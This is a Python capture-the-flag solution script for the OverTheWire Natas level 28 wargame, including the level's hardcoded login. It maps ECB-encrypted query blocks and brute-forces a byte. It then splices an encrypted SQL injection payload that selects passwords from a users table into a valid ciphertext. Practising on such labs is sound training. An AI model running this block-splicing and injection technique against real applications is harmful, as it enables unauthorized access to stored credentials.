'''
This is a script used to decrypt an ECB mode cipher encryption to solve natas28 
from http://overthewire.org/wargames/natas/natas29.html. This script does a lot....
Full write-up can be found at https://r00tblogger.wordpress.com/2019/01/29/overthewire-natas-wargame/.
'''

import base64
import requests
import string
from math import ceil

sess = requests.Session()
size = 16
username = "natas28"
passwd = "JWwR438wkgTsNKBbcJoowyysdM82YjeF"
url = "http://natas28.natas.labs.overthewire.org/"
auth = requests.auth.HTTPBasicAuth(username, passwd)

for i in range(size):
    result = sess.post(url=url, auth=auth, data={"query": "a"*i})
    print("Input size: %d\t\tURL size: %d" %(i, len(base64.b64decode(requests.utils.unquote(result.url[60:])))))
    print("="*75)
    for block in range(5):
        print("Block %d data: %s" %(block+1,
              repr(base64.b64decode(requests.utils.unquote(result.url[60:]))[block*size: (block+1)*size])))
    print()

print("Fuzzing 10th character....")
correct_data = repr(b"\x9eb&\x86\xa5&@YW\x06\t\x9a\xbc\xb0R\xbb")
for c in string.printable:
    result = sess.post(url=url, auth=auth, data={"query": "a"*9 + c})
    block = 2
    answer = repr(base64.b64decode(requests.utils.unquote(result.url[60:]))[block*size: (block+1)*size])
    if answer == correct_data:
        print("FOUND MATCH! ===> '%c'\n" % c)

SQLi = 'a'*9 + "' UNION SELECT password FROM users;#"

num_blocks = (len(SQLi) - 10) / size
if (len(SQLi) - 10) % size != 0:
    num_blocks = ceil(num_blocks)

result = sess.post(url=url, auth=auth, data={"query": SQLi})
raw_payload = base64.b64decode(requests.utils.unquote(result.url[60:]))
result = sess.post(url=url, auth=auth, data={"query": 'a'*10})
original = base64.b64decode(requests.utils.unquote(result.url[60:]))

payload = original[:size*3] + raw_payload[size*3:size*3 + (num_blocks*size)] + original[size*3:]
encrypted_payload = requests.utils.quote(base64.b64encode(payload)).replace("/", "%2F")
print(url + "search.php/?query=%s" % encrypted_payload)

